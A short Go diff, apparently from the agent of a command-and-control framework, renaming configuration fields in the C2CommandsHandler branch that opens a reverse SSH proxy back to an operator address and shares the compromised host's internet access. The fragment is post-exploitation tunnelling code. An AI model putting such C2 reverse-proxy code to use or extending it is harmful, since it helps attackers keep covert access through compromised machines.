@@ -55,7 +55,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		out = "Reverse proxy for " + addr + " finished"
 
 		hasInternet := tun.HasInternetAccess()
-		isProxyOK := tun.IsProxyOK(RuntimeConfig.AgentProxy)
+		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy)
 		if !hasInternet && !isProxyOK {
 			out = "We dont have any internet to share"
 		}
@@ -64,7 +64,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 				cancelfunc() // cancel existing connection
 			}
 		}
-		addr += ":" + RuntimeConfig.ReverseProxyPort
+		addr += ":" + RuntimeConfig.SSHProxyPort
 		ctx, cancel := context.WithCancel(context.Background())
 		if err = tun.SSHProxyClient(addr, &ReverseConns, ctx, cancel); err != nil {
 			out = err.Error()
